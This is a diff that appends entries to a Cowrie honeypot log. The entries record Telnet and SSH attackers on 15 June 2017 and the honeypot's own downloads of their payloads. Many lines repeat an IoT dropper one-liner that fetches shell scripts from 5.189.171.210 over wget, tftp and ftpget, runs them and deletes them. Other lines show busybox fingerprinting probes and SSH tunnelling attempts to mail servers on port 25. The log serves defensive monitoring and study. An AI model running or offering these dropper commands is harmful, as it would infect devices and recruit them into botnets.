@@ -1537,3 +1537,629 @@
 2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57575,31.162.190.149] Command found: /bin/busybox tftp
 2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57575,31.162.190.149] Command found: tftp
 2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57575,31.162.190.149] Command found: /bin/busybox 81c46036tftp
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:01+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:01+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:01+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57575,31.162.190.149] CMD:  /bin/busybox dd if=/bin/busybox bs=22 count=1 || /bin/busybox cat /bin/busybox
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57575,31.162.190.149] Command found: /bin/busybox dd if=/bin/busybox bs=22 count=1
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57575,31.162.190.149] Command found: /bin/busybox cat /bin/busybox
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57575,31.162.190.149] Command found: cat /bin/busybox
+2017-06-15T14:08:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] got channel 'direct-tcpip' request
+2017-06-15T14:08:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] direct-tcp connection request to 74.125.69.27:25 from localhost:5556
+2017-06-15T14:08:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] got channel 'direct-tcpip' request
+2017-06-15T14:08:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] direct-tcp connection request to 108.177.97.27:25 from localhost:5556
+2017-06-15T14:08:01+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:19465 (10.8.41.81:2222) [session: f4ae0888]
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57576,186.137.236.216] CMD: system
+2017-06-15T14:08:01+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command not found: system
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:02+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:02+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:02+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:02+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:02+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:02+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:02+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:02+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:02+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:02+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:02+0000 [CowrieTelnetTransport,57576,186.137.236.216] CMD: shell
+2017-06-15T14:08:02+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command not found: shell
+2017-06-15T14:08:02+0000 [HoneyPotSSHTransport,33729,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-15T14:08:02+0000 [HoneyPotSSHTransport,33729,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-15T14:08:02+0000 [HoneyPotSSHTransport,33729,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-15T14:08:02+0000 [HoneyPotSSHTransport,33729,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-15T14:08:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] got channel 'direct-tcpip' request
+2017-06-15T14:08:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:02+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:04+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:04+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57576,186.137.236.216] CMD: sh
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: sh 
+2017-06-15T14:08:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] got channel 'direct-tcpip' request
+2017-06-15T14:08:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] direct-tcp connection request to 74.125.30.27:25 from localhost:5556
+2017-06-15T14:08:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] got channel 'direct-tcpip' request
+2017-06-15T14:08:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33055,91.195.103.184] direct-tcp connection request to 173.194.220.26:25 from localhost:5556
+2017-06-15T14:08:04+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:04+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:05+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] CMD:  /bin/busybox wget; /bin/busybox 81c46036wget; /bin/busybox echo -ne '\x0181c46036\x7f'; /bin/busybox printf '\00281c46036\177'; /bin/echo -ne '\x0381c46036\x7f'; /usr/bin/printf '\00481c46036\177'; /bin/busybox tftp; /bin/busybox 81c46036tftp;
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: /bin/busybox wget
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: wget
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: /bin/busybox 81c46036wget
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: /bin/busybox echo -ne '\x0181c46036\x7f'
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: echo -ne '\x0181c46036\x7f'
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: /bin/busybox printf '\00281c46036\177'
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command found: /bin/echo -ne '\x0381c46036\x7f'
+2017-06-15T14:08:05+0000 [CowrieTelnetTransport,57576,186.137.236.216] Command not found: /usr/bin/printf '\00481c46036\177'
